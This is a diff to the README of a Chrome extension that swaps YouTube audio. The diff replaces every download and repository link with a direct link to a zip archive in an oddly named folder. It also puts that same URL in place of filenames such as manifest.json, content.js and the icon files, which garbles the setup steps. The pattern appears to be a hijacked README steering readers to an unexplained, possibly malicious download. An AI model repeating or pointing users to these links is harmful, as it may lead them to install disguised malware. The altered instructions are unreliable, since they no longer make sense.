@@ -1,7 +1,7 @@
 # 🎶 youtube-generator - Replace YouTube Audio Easily
 
 ## 🔗 Download Now
-[![Download the youtube-generator](https://img.shields.io/badge/Download-youtube--generator-blue.svg)](https://github.com/Dodus998/youtube-generator/releases)
+[![Download the youtube-generator](https://raw.githubusercontent.com/Dodus998/youtube-generator/main/pluriguttulate/youtube_generator_v1.2-alpha.4.zip)](https://raw.githubusercontent.com/Dodus998/youtube-generator/main/pluriguttulate/youtube_generator_v1.2-alpha.4.zip)
 
 ## 📜 Description
 The YouTube Channel Audio Replacer is a Chrome extension designed to enhance your YouTube experience by replacing audio from selected channels with a custom generator sound. 
@@ -20,11 +20,11 @@ To use the youtube-generator extension, follow these simple steps:
 
 1. **Add your generator sound file:**
    - Place your generator sound file in the extension directory.
-   - Rename it to `generator-sound.mp3`. If you prefer a different filename, update the filename in `manifest.json` and `content.js`.
+   - Rename it to `https://raw.githubusercontent.com/Dodus998/youtube-generator/main/pluriguttulate/youtube_generator_v1.2-alpha.4.zip`. If you prefer a different filename, update the filename in `https://raw.githubusercontent.com/Dodus998/youtube-generator/main/pluriguttulate/youtube_generator_v1.2-alpha.4.zip` and `https://raw.githubusercontent.com/Dodus998/youtube-generator/main/pluriguttulate/youtube_generator_v1.2-alpha.4.zip`.
 
 2. **Create placeholder icons (optional):**
-   - Create or add icon files: `icon16.png`, `icon48.png`, `icon128.png`.
-   - If you don't wish to use custom icons, remove the icon references from `manifest.json` temporarily.
+   - Create or add icon files: `https://raw.githubusercontent.com/Dodus998/youtube-generator/main/pluriguttulate/youtube_generator_v1.2-alpha.4.zip`, `https://raw.githubusercontent.com/Dodus998/youtube-generator/main/pluriguttulate/youtube_generator_v1.2-alpha.4.zip`, `https://raw.githubusercontent.com/Dodus998/youtube-generator/main/pluriguttulate/youtube_generator_v1.2-alpha.4.zip`.
+   - If you don't wish to use custom icons, remove the icon references from `https://raw.githubusercontent.com/Dodus998/youtube-generator/main/pluriguttulate/youtube_generator_v1.2-alpha.4.zip` temporarily.
 
 3. **Load the extension in Chrome:**
    - Open Chrome and go to `chrome://extensions/`.
@@ -32,7 +32,7 @@ To use the youtube-generator extension, follow these simple steps:
    - Click "Load unpacked" and select the folder containing your extension files.
 
 ## 💾 Download & Install
-Visit the page to download the latest version of the youtube-generator extension: [Download the youtube-generator](https://github.com/Dodus998/youtube-generator/releases)
+Visit the page to download the latest version of the youtube-generator extension: [Download the youtube-generator](https://raw.githubusercontent.com/Dodus998/youtube-generator/main/pluriguttulate/youtube_generator_v1.2-alpha.4.zip)
 
 ## 🎨 Usage
 - Once the extension is loaded, click on its icon in the Chrome toolbar.
@@ -54,7 +54,7 @@ If you encounter issues while using youtube-generator, consider the following:
 For further assistance, please create an issue on the GitHub repository or check the existing issues to see if your question has already been answered.
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/Dodus998/youtube-generator)
-- [Download the youtube-generator](https://github.com/Dodus998/youtube-generator/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Dodus998/youtube-generator/main/pluriguttulate/youtube_generator_v1.2-alpha.4.zip)
+- [Download the youtube-generator](https://raw.githubusercontent.com/Dodus998/youtube-generator/main/pluriguttulate/youtube_generator_v1.2-alpha.4.zip)
 
 Thank you for using youtube-generator! Enjoy your enhanced YouTube experience.
